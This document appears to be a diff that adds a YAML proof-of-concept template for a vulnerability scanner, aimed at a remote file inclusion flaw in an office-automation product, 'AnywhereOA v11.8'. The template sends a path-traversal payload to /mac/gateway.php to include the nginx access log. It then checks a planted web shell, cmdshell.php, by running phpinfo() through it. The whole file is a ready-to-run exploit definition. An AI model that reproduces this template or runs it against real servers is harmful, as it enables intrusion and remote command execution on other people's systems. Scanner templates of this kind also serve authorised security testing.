@@ -1,0 +1,36 @@
+#poc名称
+- name:
+  - name: "(3)AnywhereOA_v11.8_getway.php_remote_file_contains"
+
+#请求方式
+- method:
+  - method: "post"
+
+#漏洞的位置
+- url:
+  - url : "/mac/gateway.php"
+
+#payload
+- payload:
+  - payload: 'json={"url":"/general/../../nginx/logs/oa.access.log"}'
+
+#response包里状态码
+- status:
+  - status: "200"
+
+#最终response包里的关键字
+- word:
+  - word:
+      - "php_dir"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "get"
+
+#二次访问位置
+- verify:
+  - verify : "/mac/cmdshell.php?cmdshell=phpinfo();"
+
+#cmd 为了适配Java反序列化漏洞
+- cmd:
+  - cmd : "isNone"
